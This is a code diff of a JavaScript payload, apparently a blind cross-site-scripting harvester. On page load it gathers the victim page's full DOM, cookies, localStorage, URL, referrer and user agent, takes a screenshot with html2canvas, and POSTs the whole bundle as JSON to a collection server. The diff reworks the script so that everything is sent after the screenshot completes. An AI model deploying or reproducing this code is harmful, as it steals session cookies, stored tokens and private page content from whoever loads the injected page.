@@ -3,7 +3,7 @@ var data = {
     origin:"",
     userAgent:"",
     localStorage:"",
-    screenshot:"",
+    screenshot_encoded:"",
     cookies:"",
     referrer:"",
     text:"",
@@ -11,6 +11,7 @@ var data = {
     title:"",
     iframe:!(window.top === window)
 }
+var e = null
 
 function addEvent(element, eventName, fn) {
     if (element.addEventListener)
@@ -23,17 +24,8 @@ function addEvent(element, eventName, fn) {
     s.setAttribute( 'src', "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js" );
     document.body.appendChild( s );
 
-if( document.readyState == "complete" ) {
-    extract()
-} else { 
-    addEvent( window, "load", function(){
-        extract()
-    });
-}
 
 
-
-var extract = () => {
     getDomText()
     getUrl()
     getLocalStorage()
@@ -41,22 +33,30 @@ var extract = () => {
     getReferrer()
     getUserAgent()
     origin()
-    screenshot()
-    data.title = document.title
-    fetch('http://0.0.0.0:8080/post', {
-    method: 'POST',
-    headers: {
-      'Accept': 'application/json',
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({screenshot:data.screenshot})
-  })
-} 
 
+    data.title = document.title;
+
+
+/*     (async () => {
+        const rawResponse = await fetch('http://0.0.0.0:8080/post', {
+          method: 'POST',
+          headers: {
+            'Accept': 'application/json',
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(data)
+        });
+        const content = await rawResponse.json();
+      
+        //console.log(content);
+      })(); */
+    //console.log(data.title)
 // Trying to extract the dom text from every option possible
 function getDomText() {
     try{
         data.dom = document.documentElement.outerHTML
+
+
     } catch {
         data.dom = ''
     }
@@ -72,7 +72,6 @@ function getDomText() {
 		}
 	}
     data.text = ''
-
 }
 
 function getUrl() {
@@ -89,11 +88,6 @@ function getLocalStorage() {
     } catch  {
         data.localStorage = ''
     }
-}
-
-function encodeLocalStorage(data) {
-
-    console.log(data)
 }
 
 function cookies() {
@@ -128,11 +122,43 @@ function origin() {
     }
 }
 
+function sendData(screend_data){
+    data.screenshot_encoded = screend_data;
+    (async () => {
+        const rawResponse = await fetch('http://0.0.0.0:8080/post', {
+          method: 'POST',
+          headers: {
+            'Accept': 'application/json',
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(data)
+        });
+        const content = await rawResponse.json();
+      
+        console.log(content);
+      })();
+}
+
 function screenshot(){
     html2canvas(document.body).then(function(canvas) {
-        console.log(canvas.toDataURL())
-        data.screenshot_encoded = canvas.toDataURL();
+        data.screenshot_encoded = canvas.toDataURL()
+        sendData(canvas.toDataURL())
     });
-    
-    //
 }
+
+if( document.readyState == "complete" ) {
+    screenshot()
+    console.log(data.screenshot_encoded)
+
+    //extract()
+   
+} else { 
+    addEvent( window, "load", function(){
+        screenshot()
+        //extract()
+    });
+}
+
+
+//console.log(data);
+
